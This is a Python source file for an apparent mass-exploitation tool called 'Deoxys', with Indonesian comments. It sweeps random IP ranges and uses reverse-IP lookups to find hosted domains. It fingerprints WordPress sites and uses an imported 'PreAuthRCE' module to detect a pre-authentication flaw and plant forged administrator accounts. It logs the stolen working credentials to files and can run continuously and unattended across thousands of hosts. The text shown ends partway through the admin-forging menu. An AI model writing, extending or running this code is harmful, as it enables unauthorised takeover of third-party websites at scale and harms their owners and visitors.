# main.py - FULL VERSION
import os
import sys
import signal
import atexit
import time
from config import Config
from proxy_manager import ProxyManager
from cache_manager import CacheManager, get_watchdog
from scanner import MovableTypeScanner
from ip_generator import IPGenerator
from forge_admin_v2 import add_admin, try_login

# ============================================================================
# MODULE-LEVEL CONSTANTS & HELPERS (shared antara Opsi 2 & Opsi 5 Forge)
# ============================================================================
FORGE_OUT_DIR    = "forge_results"
FORGE_SUC_FILE   = os.path.join(FORGE_OUT_DIR, "suc.txt")
FORGE_FAIL_FILE  = os.path.join(FORGE_OUT_DIR, "faillog.txt")
# retry.txt: vuln terdeteksi + forge GAGAL (koneksi putus/timeout/exception)
# → bisa di-retry manual nanti karena kerentanan nyata tapi bukan salah logic
FORGE_RETRY_FILE = os.path.join(FORGE_OUT_DIR, "retry.txt")


def _forge_results_ensure():
    """Pastikan folder & file hasil forge sudah ada (aman untuk multi-call)."""
    os.makedirs(FORGE_OUT_DIR, exist_ok=True)
    for p in (FORGE_SUC_FILE, FORGE_FAIL_FILE, FORGE_RETRY_FILE):
        if not os.path.exists(p):
            open(p, "a").close()


def _looks_like_wordpress(domain, timeout=12):
    """
    Cek cepat apakah domain itu WordPress.
    Per keputusan oxz (revisi final):
      1) PRIORITAS: cek header HTTP dari 1 request index — kalau ada
         "wp-json" / "api.w.org" di header (Link: .../wp-json/), langsung lolos
         TANPA download body. 9/9 target nyata membocorkan sinyal ini di header.
      2) FALLBACK: jika header tidak membocorkan wp-json, fetch 16KB body index
         & cek "wp-content"/"wp-includes" (robust terhadap WAF/CDN yang strip
         header Link-nya).
      3) Urutan skema: https non-www -> https www -> http non-www -> http www;
         stop begitu ketemu. Tidak ada cek /wp-login.php.

    Return: str (URL base https/http) jika lolos WP, None jika bukan/error.
    """
    import ssl as _ssl
    import urllib.request as _u_req
    import urllib.error as _u_err

    ctx = _ssl.create_default_context()
    ctx.check_hostname = False
    ctx.verify_mode = _ssl.CERT_NONE
    opener = _u_req.build_opener(
        _u_req.HTTPSHandler(context=ctx),
        _u_req.HTTPHandler(),
        _u_req.ProxyHandler({}))

    def _check_wp_signals(headers, body):
        # headers: dict str->str. Cek header dulu (murah, tanpa body)
        h = {str(k).lower(): str(v) for k, v in (headers or {}).items()}
        blob_hdr = " ".join(f"{k}: {v}" for k, v in h.items())
        blob = (blob_hdr + " " + (body or ""))[:20000].lower()
        return ("wp-json" in blob) or ("api.w.org" in blob)

    def _check_body_wp(body):
        blob = (body or "").lower()
        return ("wp-content" in blob) or ("wp-includes" in blob)

    variants = [f"https://{domain}",
                f"https://www.{domain}" if not domain.startswith("www.") else domain,
                f"http://{domain}",
                f"http://www.{domain}" if not domain.startswith("www.") else domain]
    seen, last_hdrs = set(), None
    for scheme in variants:
        if scheme in seen:
            continue
        seen.add(scheme)
        try:
            with opener.open(scheme, timeout=timeout) as resp:
                last_hdrs = resp.headers
                body_chunk = (resp.read(16 * 1024) or b"").decode("latin-1", "ignore")
                if _check_wp_signals(last_hdrs, ""):
                    return scheme
                if _check_body_wp(body_chunk):
                    return scheme
        except _u_err.HTTPError:
            # Server merespon (WP di belakang WAF) — ambil header & cek body
            try:
                body_chunk = (resp.read(16 * 1024) or b"").decode("latin-1", "ignore")
                last_hdrs = resp.headers
                if _check_wp_signals(last_hdrs, ""):
                    return scheme
                if _check_body_wp(body_chunk):
                    return scheme
            except Exception:
                pass
        except Exception:
            pass
    # Fallback: header ter-akhir (misal HTTPError 404/503 di atas semua
    # varian) bisa membocorkan sinyal WP di header-nya, cek sekali lagi
    if last_hdrs and _check_wp_signals(last_hdrs, ""):
        return variants[-1]
    return None


def _forge_single_url(url, *, sleep_s, delay_s, user_in, pass_in, prefix_in,
                      do_verify, auto_forge, ip,
                      counters, forge_lock, fa=None,
                      not_vuln_counter_key="not_vuln"):
    """
    Forge admin untuk 1 URL — jalur shared Opsi 2 (file) & Opsi 5 (continuous).

    Parameter:
      not_vuln_counter_key : key di `counters` yang di-increment saat target
                             tidak vulnerable. Default "not_vuln" (Opsi 2).
                             Opsi 5 pakai "fail" (sesuai perilaku lama).

    Alur:
      1. Pre-filter detect() -> silent jika not_vuln (increment counters[not_vuln_counter_key])
      2. (Opsi 5 only) auto_forge prompt
      3. add_admin() -> verify (jika do_verify) -> save file

    Catatan: dedup forged_set (Opsi 5) dilakukan di wrapper, BUKAN di sini —
    sehingga dedup & _looks_like_wordpress tetap lokal di Opsi 5 (kecepatan &
    urutan HTTP request sama persis seperti kode lama).
    """
    import threading as _threading
    from forge_admin_v2 import add_admin, try_login, C, PreAuthRCE

    # ---- pre-filter detect ----
    base = url.rstrip("/")
    get_watchdog().tick(f"forge_detect:start:{base}")
    try:
        pre = PreAuthRCE(base, timeout=12, proxy=None,
                         sleep=sleep_s, route="auto")
        det = pre.detect(rounds=2)
    except Exception:
        det = None
    get_watchdog().tick(f"forge_detect:done:{base}")
    if not det or not det.get("vulnerable"):
        with forge_lock:
            counters[not_vuln_counter_key] = counters.get(not_vuln_counter_key, 0) + 1
        return  # silent: tidak vulnerable

    with forge_lock:
        counters["attempt"] = counters.get("attempt", 0) + 1
        counters["wp"] = counters.get("wp", 0) + 1

    # ---- auto_forge prompt (Opsi 5) ----
    if auto_forge is False:
        import sys
        ans = input(f"  Forge admin on {url}? (Y/n) [y]: ").strip().lower()
        if ans == "n":
            return

    # ---- forge ----
    try:
        get_watchdog().tick(f"forge_add_admin:start:{base}")
        r = add_admin(
            url,
            username=user_in,
            password=pass_in,
            delay=delay_s,
            sleep=sleep_s,
            force_prefix=prefix_in,
            verbose=False,
        )
        get_watchdog().tick(f"forge_add_admin:done:{base}")
        username, password, email = r[0], r[1], r[2]
        line = f"{url} | user={username} | pass={password} | email={email}" + \
               (f" | ip={ip}" if ip else "")

        # BUG-1 FIX: forged_ok sebelumnya selalu False kalau do_verify=False
        # karena blok else menetapkan forged_ok=False untuk "NO_VERIFY".
        # Padahal forge sukses (add_admin berhasil) harus selalu masuk suc.txt,
        # terlepas dari apakah verify diaktifkan atau tidak.
        # Logika baru:
        #   verify=True + login OK  → suc.txt  [VERIFIED]
        #   verify=True + login FAIL → faillog.txt [VERIFY_FAIL]
        #   verify=False            → suc.txt  [NO_VERIFY]  ← fix utama
        verify_note  = None
        login_method = None
        verify_ok    = True   # default: anggap sukses kalau tidak ada verify

        if do_verify:
            try:
                get_watchdog().tick(f"forge_verify:start:{base}")
                v = try_login(base, username, password)
                get_watchdog().tick(f"forge_verify:done:{base}")
                login_method = v[0]
                if v[1]:
                    verify_note = "VERIFIED"
                    verify_ok   = True
                else:
                    verify_note = f"VERIFY_FAIL ({v[0]}: {v[2]})"
                    verify_ok   = False
            except Exception as ve:
                verify_note = f"VERIFY_ERR ({ve})"
                verify_ok   = False
        else:
            verify_note = "NO_VERIFY"
            verify_ok   = True   # forge berhasil tanpa cek login → suc

        # ---- save ----
        out_line = f"{url} {username} {password}" + \
                   (f" [{verify_note}]" if verify_note else "")
        with forge_lock:
            if verify_ok:
                # Forge sukses (+ verify OK atau tidak di-verify) → suc.txt
                counters["ok"] = counters.get("ok", 0) + 1
                with open(FORGE_SUC_FILE, "a") as f:
                    f.write((line + " | " + verify_note).rstrip(" | ") + "\n")
                print(f"[√] SUC: {out_line}", flush=True)
            else:
                # Forge sukses tapi verify GAGAL → faillog.txt
                counters["fail"] = counters.get("fail", 0) + 1
                with open(FORGE_FAIL_FILE, "a") as f:
                    f.write((line + " | " + verify_note).rstrip(" | ") + "\n")
                print(f"[!] FAIL: {out_line}", flush=True)
    except Exception as e:
        # Forge GAGAL (exception) tapi target VULN (lolos detect) → retry.txt
        # Ini berbeda dengan "tidak vuln" — target nyata tapi forge error
        # (koneksi putus, timeout, respons tidak terduga, dll).
        # User bisa jalankan ulang file ini nanti.
        err_msg = str(e)[:150]
        retry_line = f"{url}" + (f" | ip={ip}" if ip else "") + f" | ERR={err_msg}"
        with forge_lock:
            counters["retry"] = counters.get("retry", 0) + 1
            with open(FORGE_RETRY_FILE, "a") as f:
                f.write(retry_line + "\n")
        print(f"  [↻] RETRY: {url} → {err_msg}", flush=True)


class MovableTypeMassScanner:
    def __init__(self):
        self.proxy_manager = None
        self.cache_manager = None
        self.scanner = None
        self.ip_generator = None
        self.running = True
        
        # Variabel untuk status bar dan counter
        self.skip_counter = 0
        self.total_ips_processed = 0
        self.total_mt = 0
        self.total_mtv4 = 0
        self.current_cycle = 0
        
        # State management untuk continuous mode
        self.scan_level = 1  # 1, 2
        self.scan_phase = None  # 'explore', 'sampling', 'exploit'
        self.current_base_three_octets = None  # Base untuk exploit mode
        
        # Counter forge (status bar)
        self.total_wp2shell = 0
        self.total_wp2shell_rce = 0
        self.rce_authorized = False
        
        # Setup signal handlers
        signal.signal(signal.SIGINT, self.signal_handler)
        signal.signal(signal.SIGTERM, self.signal_handler)
        
        # [FIX-CTRLC] Flag idempotent: cleanup() dipanggil oleh signal_handler
        # (Ctrl+C) ATAU atexit, keduanya. _cleaned= False → pertama jalan,
        # kedua skip. Ini menggantikan atexit.register(self.cleanup) yang
        # sebelumnya memicu double-cleanup + stuck di run kedua (SQLite sudah
        # di-close di run pertama, get_stats/flush_all hang).
        self._cleaned = False

        # Register cleanup via wrapper idempotent (skip jika signal_handler
        # sudah sempat menjalankan cleanup sebelum sys.exit(0) dipanggil).
        atexit.register(self._atexit_cleanup)
    
    def _atexit_cleanup(self):
        """Wrapper untuk atexit: hanya jalankan cleanup jika belum pernah.
        Dipakai saat proses exit normal / SIGTERM yang tidak dicegat signal_handler,
        atau sebagai fallback jika signal_handler dipanggil tapi sys.exit belum
        sempat menyelesaikan sebelum atexit hook."""
        self.cleanup()
    
    def signal_handler(self, signum, frame):
        """Handle Ctrl+C — display minimal: 1 baris saja."""
        print("\n\n[!] Interrupt received, cleaning up…")
        self.running = False
        self.cleanup(verbose=False)
        sys.exit(0)
    
    def cleanup(self, verbose=True):
        """Bersihkan resources (idempotent: aman dipanggil 2x).
        verbose=False → diam, hanya jalankan flush/close tanpa print."""
        if self._cleaned:
            return
        self._cleaned = True

        if verbose:
            print("[*] Cleaning up resources...")

        if self.cache_manager:
            try:
                self.cache_manager.flush_all()
                if verbose:
                    stats = self.cache_manager.get_stats()
                    print(f"[*] Cache stats: {stats}")
                self.cache_manager.close()
            except Exception as e:
                if verbose:
                    print(f"[-] cache cleanup error: {e}")

        if self.proxy_manager:
            if verbose:
                self.proxy_manager.print_stats()
            self.proxy_manager.stop()

        if verbose:
            print("[✓] Cleanup completed")
    
    def print_header(self):
        """Tampilkan header — teks sederhana, tanpa ASCII art/figlet."""
        print("Deoxys — Movable Type Mass Scanner")

    def update_status_bar(self):
        """Update single-line status bar"""
        current_time = time.strftime("%H:%M")
        
        if self.scan_level == 1:
            mode = "L1"
        elif self.scan_phase == 'explore':
            mode = "L2-EXP"
        elif self.scan_phase == 'sampling':
            mode = "L2-SMP"
        else:
            mode = "L2-EPT"
        
        status_text = f"\r[{current_time}] {mode} | IP: {self.total_ips_processed} | MT: {self.total_mt} | MTv4: {self.total_mtv4} | SKIP: {self.skip_counter}"
        sys.stdout.write(status_text.ljust(80))
        sys.stdout.flush()
    
    def update_status_bar_forge(self):
        """Status bar untuk forge admin"""
        current_time = time.strftime("%H:%M")
        mode = "L1" if self.scan_level == 1 else f"L2-{self.scan_phase.upper()[:3]}"
        status = f"\r[{current_time}] {mode} | IP: {self.total_ips_processed} | FORGE-OK: {self.total_wp2shell} | FORGED: {self.total_wp2shell_rce} | SKIP: {self.skip_counter}"
        sys.stdout.write(status.ljust(80))
        sys.stdout.flush()
    
    def increment_mt(self):
        self.total_mt += 1
        self.update_status_bar()
    
    def increment_mtv4(self):
        self.total_mtv4 += 1
        self.update_status_bar()
    
    def increment_forge_wp(self):
        self.total_wp2shell += 1
        self.update_status_bar_forge()
    
    def increment_forge_rce(self):
        self.total_wp2shell_rce += 1
        self.update_status_bar_forge()
    
    def sample_base_quality(self, base_three_octets):
        """
        Sample IP VALID dari base untuk cek kualitas
        Mencari SAMPLE_SIZE IP valid dari base, lalu test reverse IP
        
        LOGIKA: Base lolos jika ADA MINIMAL 1 sample yang memiliki ≥MIN_DOMAINS_PER_IP domains
        
        Args:
            base_three_octets: contoh "157.7.109."
        
        Returns:
            (is_good, sampled_ips, domain_counts, good_ip): 
                is_good: True jika ada minimal 1 sample bagus
                sampled_ips: list IP yang sudah di-sample
                domain_counts: dict {ip: domain_count} untuk report
                good_ip: IP pertama yang bagus (None jika tidak ada)
        """
        print(f"\n{'─'*50}")
        print(f"[SAMPLING] Base: {base_three_octets}x")
        print(f"[SAMPLING] Mencari {Config.SAMPLE_SIZE} IP VALID dari base ini...")
        print(f"[SAMPLING] Threshold: minimal {Config.MIN_DOMAINS_PER_IP} domains per IP")
        print(f"[SAMPLING] Syarat lolos: minimal 1 dari {Config.SAMPLE_SIZE} sample memiliki ≥{Config.MIN_DOMAINS_PER_IP} domains")
        print(f"{'─'*50}")
        
        # Cari IP valid dari base ini
        valid_ips = self.ip_generator.get_valid_ips_from_base(
            base_three_octets, 
            max_ips=Config.SAMPLE_SIZE,
            max_attempts=500
        )
        
        if len(valid_ips) < 1:
            print(f"\n[SAMPLING] ✗ BASE REJECTED!")
            print(f"[SAMPLING] No valid IPs found in this base")
            return False, [], {}, None
        
        print(f"\n[SAMPLING] Found {len(valid_ips)} valid IPs, testing all {Config.SAMPLE_SIZE} samples...")
        print(f"{'─'*50}")
        
        sampled_ips = []
        domain_counts = {}
        good_ip = None
        good_count = 0
        bad_ips = []
        
        # CEK SEMUA SAMPLE (tidak berhenti di tengah)
        for idx, ip in enumerate(valid_ips[:Config.SAMPLE_SIZE], 1):
            sampled_ips.append(ip)
            
            # Cek apakah IP sudah diproses sebelumnya
            if self.cache_manager.is_ip_processed(ip):
                print(f"  [{idx:2d}] {ip} → [CACHED] skipping test")
                domain_counts[ip] = -1
                continue
            
            print(f"  [{idx:2d}] {ip} → checking reverse IP...", end=" ", flush=True)
            
            # PATCH 10-28: tntcode DICABUT (Cloudflare) — pakai hackertarget saja.
            domains_ht = self.scanner.reverse_ip_hackertarget(ip)
            
            # Gabungkan domain unik
            all_domains = set(domains_ht)
            domain_count = len(all_domains)
            domain_counts[ip] = domain_count
            
            if domain_count >= Config.MIN_DOMAINS_PER_IP:
                print(f"✓ {domain_count} domains (GOOD)")
                good_count += 1
                if good_ip is None:
                    good_ip = ip
            else:
                print(f"✗ {domain_count} domains (BAD - need {Config.MIN_DOMAINS_PER_IP})")
                bad_ips.append(ip)
        
        # Tampilkan ringkasan
        print(f"{'─'*50}")
        print(f"[SAMPLING] Hasil: {good_count} GOOD, {len(bad_ips)} BAD, {Config.SAMPLE_SIZE - good_count - len(bad_ips)} CACHED")
        
        # EVALUASI: apakah ada minimal 1 sample bagus?
        if good_count >= 1:
            print(f"[SAMPLING] ✓ BASE QUALIFIED! (found {good_count} good sample(s))")
            if good_ip:
                print(f"[SAMPLING] Contoh IP bagus: {good_ip} ({domain_counts[good_ip]} domains)")
            return True, sampled_ips, domain_counts, good_ip
        else:
            print(f"[SAMPLING] ✗ BASE REJECTED! (no sample reached {Config.MIN_DOMAINS_PER_IP} domains)")
            return False, sampled_ips, domain_counts, None
    
    def run(self):
        """Main execution"""
        self.print_header()
        
        # Inisialisasi komponen
        print("[*] Initializing components...")
        
        # Proxy Manager
        print("[*] Starting Proxy Manager...")
        self.proxy_manager = ProxyManager()
        
        # Cache Manager
        print("[*] Starting Cache Manager...")
        self.cache_manager = CacheManager()
        
        # Scanner (kirim referensi self untuk update counter)
        self.scanner = MovableTypeScanner(self.proxy_manager, self.cache_manager, self)
        
        # IP Generator
        self.ip_generator = IPGenerator(self.cache_manager)
        
        # Pilih metode (loop: kembali ke menu setelah opsi selesai, kecuali Exit)
        while True:
            print("\n" + "="*50)
            print("SELECT INPUT METHOD")
            print("="*50)
            print("1. Scan from IP list file")
            print("2. Scan with RNG IP (single batch)")
            print("3. True Continuous Scan (Movable Type)")
            print("4. Show statistics")
            print("5. Forge WordPress Admin (PreAuthRCE - forge_admin_v2)")
            print("6. Exit")

            choice = input("\nChoice (1-6): ").strip()

            if choice == '1':
                self.scan_from_file()
            elif choice == '2':
                self.scan_with_rng()
            elif choice == '3':
                self.continuous_scan()
            elif choice == '4':
                self.show_stats()
            elif choice == '5':
                self.forge_admin_mode()
            elif choice == '6':
                print("\n[!] Exit requested. Cleaning up…")
                self.running = False
                self.cleanup(verbose=False)
                print("[✓] Goodbye!")
                return
            else:
                print("[!] Invalid choice!")
                continue

            # Kembali ke menu jika masih running (opsi selesai normal)
            if not self.running:
                print("\n[!] Session stopped. Cleaning up…")
                self.cleanup(verbose=False)
                return
            print("\n[*] Back to menu.")
    
    def scan_from_file(self):
        """Scan dari file"""
        filename = input("IP list file: ").strip()
        
        try:
            with open(filename, 'r') as f:
                ips = [line.strip() for line in f if line.strip()]
            
            print(f"[*] Loaded {len(ips)} IPs")
            
            get_watchdog().activate()
            from concurrent.futures import ThreadPoolExecutor, as_completed
            
            with ThreadPoolExecutor(max_workers=Config.MAX_THREADS_REVERSE) as executor:
                futures = []
                for ip in ips:
                    if not self.running:
                        break
                    
                    if not self.cache_manager.is_ip_processed(ip):
                        futures.append(executor.submit(self.scanner.process_ip, ip))
                    else:
                        print(f"[↺] Skipping cached IP: {ip}")
                
                for future in as_completed(futures):
                    if not self.running:
                        break
                    try:
                        future.result()
                    except Exception as e:
                        print(f"[-] Error: {e}")
                        
        except Exception as e:
            print(f"[!] Error: {e}")
    
    def scan_with_rng(self):
        """Scan dengan RNG IP (single batch)"""
        base_ip = input("Base IP (e.g., 157.7.44): ").strip()
        
        if base_ip.count('.') == 2:
            base_ip = base_ip + '.1'
        
        try:
            max_valid = input(f"Number of IPs (default {Config.MAX_VALID_RNG}): ").strip()
            if max_valid:
                max_valid = min(int(max_valid), Config.MAX_VALID_RNG_LIMIT)
            else:
                max_valid = Config.MAX_VALID_RNG
        except:
            max_valid = Config.MAX_VALID_RNG
        
        print(f"[*] Will generate up to {max_valid} valid IPs")
        
        get_watchdog().activate()
        self.ip_generator.stream_ips(
            base_ip, 
            self.scanner.process_ip,
            max_valid
        )
    
    def continuous_scan(self):
        """
        TRUE CONTINUOUS SCAN MODE - WITH SMART LEVEL 2 SAMPLING
        Level 1: Scan ALL 254 IPs dari 3 oktet base
        Level 2 Explore: Mencari base 3 oktet baru (acak X dan Y) - HANYA IP VALID
        Level 2 Sampling: Test 10 IP VALID dari base yang ditemukan
        Level 2 Exploit: Scan FULL jika minimal 1 sample ≥20 domains
        """
        print("\n" + "="*60)
        print("TRUE CONTINUOUS SCAN MODE (WITH SMART SAMPLING)")
        print("="*60)
        print("[*] Press Ctrl+C to stop")
        print("[*] Level 1: Scan semua 254 IP dari 3 oktet base")
        print("[*] Level 2 Explore: Mencari base 3 oktet baru (acak X dan Y)")
        print(f"[*] Level 2 Sampling: Test {Config.SAMPLE_SIZE} IP VALID dari base")
        print(f"[*] Level 2 Exploit: Scan FULL jika minimal 1 sample ≥{Config.MIN_DOMAINS_PER_IP} domains")
        print("[*] Tools akan terus berjalan sampai Ctrl+C\n")
        
        # Input base IP untuk Level 1 (3 oktet)
        base_input = input("Base IP untuk Level 1 (3 oktet, e.g., 157.7.44): ").strip()
        
        # Validasi input
        if base_input.count('.') != 2:
            print("[!] Please enter 3 octets (e.g., 157.7.44)")
            return
        
        # Siapkan base untuk Level 1 (tambahkan .1 untuk format)
        base_level1 = base_input + '.1'
        
        # Siapkan base untuk Level 2 (2 oktet pertama)
        base_two_octets = base_input[:base_input.rfind('.')] + '.'
        
        # Reset semua counters
        self.total_ips_processed = 0
        self.total_mt = 0
        self.total_mtv4 = 0
        self.skip_counter = 0
        self.current_cycle = 0
        
        # Reset state management
        self.scan_level = 1
        self.scan_phase = None
        self.current_base_three_octets = None
        # [BLACKLIST] Base lama tidak boleh diputar lagi oleh explore,
        # jadi Explore ronde ke-2 dst otomatis cari base baru yang belum dipakai.
        self.explored_bases = set()
        
        print(f"\n[*] Level 1 base: {base_input}.x")
        print(f"[*] Level 2 base: {base_two_octets}x.y")
        print(f"[*] Sampling threshold: {Config.MIN_DOMAINS_PER_IP} domains per IP (cukup 1 IP bagus)")
        print(f"[*] Memulai scan...\n")
        
        get_watchdog().activate()
        self.update_status_bar()
        print()
        
        while self.running:
            
            # ========== LEVEL 1: SCAN SEMUA 254 IP ==========
            if self.scan_level == 1:
                print(f"\n{'='*60}")
                print(f"[LEVEL 1] - Scanning semua 254 IP dari {base_input}.x")
                print(f"{'='*60}")
                
                valid_ips_found = 0
                
                for ip in self.ip_generator.generate_ips_level1_full(base_level1):
                    if not self.running:
                        break
                    
                    # Cek cache dulu
                    if self.cache_manager.is_ip_processed(ip):
                        print(f"[↺] Skipping cached IP: {ip}")
                    else:
                        self.total_ips_processed += 1
                        self.scanner.process_ip(ip)
                        valid_ips_found += 1
                        self.update_status_bar()
                
                # Level 1 selesai, langsung pindah ke Level 2 Explore
                print(f"\n\n{'!'*60}")
                print(f"[!] LEVEL 1 COMPLETED!")
                print(f"[!] Total valid IPs found: {valid_ips_found}")
                print(f"[!] Switching to LEVEL 2 (Explore Mode)...")
                print(f"{'!'*60}\n")
                
                self.scan_level = 2
                self.scan_phase = 'explore'
                self.skip_counter = 0
                self.current_base_three_octets = None
                time.sleep(2)
            
            # ========== LEVEL 2 EXPLORE: MENCARI BASE BARU (HANYA IP VALID) ==========
            elif self.scan_level == 2 and self.scan_phase == 'explore':
                print(f"\n{'='*60}")
                print(f"[LEVEL 2 - EXPLORE MODE] - Mencari base 3 oktet baru")
                print(f"Base: {base_two_octets}x.y")
                print(f"HANYA IP VALID (ada PTR record) yang akan diproses")
                print(f"Setelah menemukan base, akan di-sample {Config.SAMPLE_SIZE} IP")
                print(f"{'='*60}")
                
                found_new_base = False
                
                for ip in self.ip_generator.generate_ips_level2_explore(base_two_octets, Config.MAX_VALID_RNG):
                    if not self.running:
                        break
                    
                    if self.cache_manager.is_ip_processed(ip):
                        # SKIP - IP sudah pernah diproses
                        self.skip_counter += 1
                        self.update_status_bar()
                        
                        # Jika skip mencapai 500 tanpa nemu IP baru, reset dan lanjut cari
                        if self.skip_counter >= 500:
                            print(f"\n[!] Skip counter reached 500 without new IP in Explore mode!")
                            print(f"[!] Resetting and continuing search...")
                            self.skip_counter = 0
                            break
                        
                    else:
                        # IP BARU VALID DITEMUKAN!
                        # [BLACKLIST] Ekstrak base dulu, lewati kalau sudah pernah
                        # dipergunakan di ronde explore sebelumnya (L2/L3/L4...).
                        ip_parts = ip.split('.')
                        if len(ip_parts) == 4:
                            candidate_base = '.'.join(ip_parts[:3]) + '.'
                            if candidate_base in self.explored_bases:
                                # Base sudah dipakai — anggap skip, cari IP lain
                                self.skip_counter += 1
                                self.update_status_bar()
                                if self.skip_counter >= 500:
                                    print(f"\n[!] Skip counter reached 500 (blacklist aktif) — rotasi ulang")
                                    self.skip_counter = 0
                                    break
                                continue
                        # Lepas blacklist
                        found_new_base = True
                        self.total_ips_processed += 1
                        self.scanner.process_ip(ip)
                        self.update_status_bar()
                        
                        # Tandai base ini sudah di-explore
                        if len(ip_parts) == 4:
                            base_key = '.'.join(ip_parts[:3]) + '.'
                            self.explored_bases.add(base_key)
                        
                        # Ekstrak 3 oktet dari IP yang ditemukan
                        ip_parts = ip.split('.')
                        if len(ip_parts) == 4:
                            new_base = '.'.join(ip_parts[:3]) + '.'
                            
                            print(f"\n{'*'*60}")
                            print(f"[✓] FOUND NEW BASE IN EXPLORE MODE!")
                            print(f"[✓] IP: {ip}")
                            print(f"[✓] New base 3 oktet: {new_base}")
                            print(f"[✓] Moving to SAMPLING phase...")
                            print(f"{'*'*60}\n")
                            
                            # Pindah ke sampling phase
                            self.scan_phase = 'sampling'
                            self.current_base_three_octets = new_base
                            self.skip_counter = 0
                            break
                
                # Jika tidak menemukan base baru dalam cycle ini, lanjut explore lagi
                if not found_new_base and self.running and self.scan_phase == 'explore':
                    print(f"\n[*] No new base found in this explore cycle")
                    print(f"[*] Continuing explore mode...")
                    time.sleep(5)
            
            # ========== LEVEL 2 SAMPLING: TEST KUALITAS BASE ==========
            elif self.scan_level == 2 and self.scan_phase == 'sampling':
                print(f"\n{'='*60}")
                print(f"[LEVEL 2 - SAMPLING PHASE] - Testing base quality")
                print(f"Base: {self.current_base_three_octets}x")
                print(f"{'='*60}")
                
                # Lakukan sampling quality check
                is_good_base, sampled_ips, domain_counts, good_ip = self.sample_base_quality(self.current_base_three_octets)
                
                # Tandai sample IP sebagai processed (agar tidak diproses ulang)
                for ip in sampled_ips:
                    if not self.cache_manager.is_ip_processed(ip):
                        status = 'sampled_good' if domain_counts.get(ip, 0) >= Config.MIN_DOMAINS_PER_IP else 'sampled_bad'
                        self.cache_manager.mark_ip_processed(ip, status)
                
                if not is_good_base:
                    print(f"\n[!] Base {self.current_base_three_octets}x is LOW QUALITY!")
                    print(f"[!] No sample met the {Config.MIN_DOMAINS_PER_IP} domains threshold")
                    print(f"[!] Skipping full scan, returning to EXPLORE mode...")
                    
                    # Kembali ke explore mode
                    self.scan_phase = 'explore'
                    self.current_base_three_octets = None
                    self.skip_counter = 0
                    time.sleep(2)
                    continue  # Langsung lanjut ke cycle berikutnya
                
                # BASE BAGUS (ada minimal 1 sample bagus), lanjut ke exploit mode
                print(f"\n[✓] Base {self.current_base_three_octets}x is HIGH QUALITY!")
                print(f"[✓] Found at least 1 good IP (example: {good_ip} with {domain_counts.get(good_ip, 0)} domains)")
                print(f"[✓] Proceeding to EXPLOIT mode (full scan of 1-254)...")
                
                self.scan_phase = 'exploit'
                time.sleep(2)
            
            # ========== LEVEL 2 EXPLOIT: SCAN SEMUA 254 IP DARI BASE ==========
            elif self.scan_level == 2 and self.scan_phase == 'exploit':
                print(f"\n{'='*60}")
                print(f"[LEVEL 2 - EXPLOIT MODE] - Scanning ALL 254 IPs")
                print(f"Base: {self.current_base_three_octets}x")
                print(f"HANYA IP VALID (ada PTR record) yang akan diproses")
                print(f"{'='*60}")
                
                valid_ips_found = 0
                
                for ip in self.ip_generator.generate_ips_level2_exploit_full(self.current_base_three_octets):
                    if not self.running:
                        break
                    
                    # Skip jika IP sudah diproses (termasuk sample yang sudah di-reverse)
                    if self.cache_manager.is_ip_processed(ip):
                        print(f"[↺] Skipping cached IP: {ip}")
                        continue
                    
                    self.total_ips_processed += 1
                    self.scanner.process_ip(ip)
                    valid_ips_found += 1
                    self.update_status_bar()
                
                # Exploit mode selesai, kembali ke explore mode
                print(f"\n\n{'!'*60}")
                print(f"[!] LEVEL 2 EXPLOIT COMPLETED!")
                print(f"[!] Base: {self.current_base_three_octets}x")
                print(f"[!] Total valid IPs found: {valid_ips_found}")
                print(f"[!] Returning to EXPLORE MODE to find new base...")
                print(f"{'!'*60}\n")
                
                self.scan_phase = 'explore'
                self.current_base_three_octets = None
                self.skip_counter = 0
                time.sleep(2)
            
            # Status update periodik
            if self.running and self.scan_phase != 'sampling':
                print(f"\n[#] STATUS UPDATE")
                print(f"    Total IP processed: {self.total_ips_processed}")
                print(f"    Total MT found: {self.total_mt}")
                print(f"    Total MTv4 found: {self.total_mtv4}")
                if self.scan_level == 1:
                    print(f"    Current mode: Level 1")
                elif self.scan_phase == 'explore':
                    print(f"    Current mode: Level 2 Explore (skip: {self.skip_counter})")
                elif self.scan_phase == 'sampling':
                    print(f"    Current mode: Level 2 Sampling (base: {self.current_base_three_octets})")
                else:
                    print(f"    Current mode: L2-SCAN Exploit (base: {self.current_base_three_octets}x)")
                self.update_status_bar()
    
    def forge_admin_mode(self):
        """Opsi 6: Forge WordPress Admin via PreAuthRCE (forge_admin_v2)"""
        import sys, os, json, time, secrets, hashlib, re, ssl, socket, urllib.request, urllib.parse, argparse, threading
        from concurrent.futures import ThreadPoolExecutor, as_completed
        import forge_admin_v2 as fa

        print("\n" + "="*60)
        print("FORGE WORDPRESS ADMIN - PreAuthRCE (forge_admin_v2)")
        print("="*60)
        print()

        # Input mode
        print("Target input mode:")
        print("  1. Single URL")
        print("  2. File (1 URL per baris)")
        print("  3. Continuous Mode (scan IP ala opsi 5, auto-forge admin)")
        mode_in = input("\nChoice (1/2/3) [1]: ").strip() or "1"

        urls = []
        is_file_mode = False
        if mode_in == "2":
            fpath = input("File path: ").strip()
            if not os.path.exists(fpath):
                print(f"[!] File tidak ditemukan: {fpath}")
                return
            with open(fpath, "r") as f:
                urls = [ln.strip() for ln in f if ln.strip()]
            is_file_mode = True
            print(f"[*] Loaded {len(urls)} target(s)")
        elif mode_in == "3":
            self.forge_continuous_mode()
            return
        elif mode_in == "1":
            url_in = input("Target URL (https://...): ").strip()
            if not url_in:
                print("[!] URL kosong, batal.")
                return
            urls = [url_in]
        else:
            print(f"[!] Invalid mode input ('{mode_in}'), batal.")
            return

        # Opsi
        user_in  = input("Username (kosong = random w2s_xxx): ").strip() or None
        pass_in  = input("Password  (kosong = random strong): ").strip() or None
        delay_in = input("Oracle unit sleep  [0.15]: ").strip() or "0.15"
        sleep_in = input("SLEEP detect sec   [4]: ").strip() or "4"
        jobs_in  = input("Threads/jobs       [10]: ").strip() or "10"
        prefix_in= input("WP table prefix    (kosong = auto-detect): ").strip() or None
        verify_in = input("Verify login after forge? (y/N) [N]: ").strip().lower()
        do_verify = (verify_in == "y")

        delay = float(delay_in)
        sleep_s = float(sleep_in)
        jobs = int(jobs_in)

        print()
        print(f"[*] Targets: {len(urls)} | Jobs: {jobs} | Delay: {delay}s | Sleep: {sleep_s}s")
        if user_in:  print(f"[*] User: {user_in}  Pass: {'(set)' if pass_in else '(random)'}")
        if prefix_in: print(f"[*] Prefix forced: {prefix_in}")
        if do_verify:    print(f"[*] Will verify login after forge")
        print()
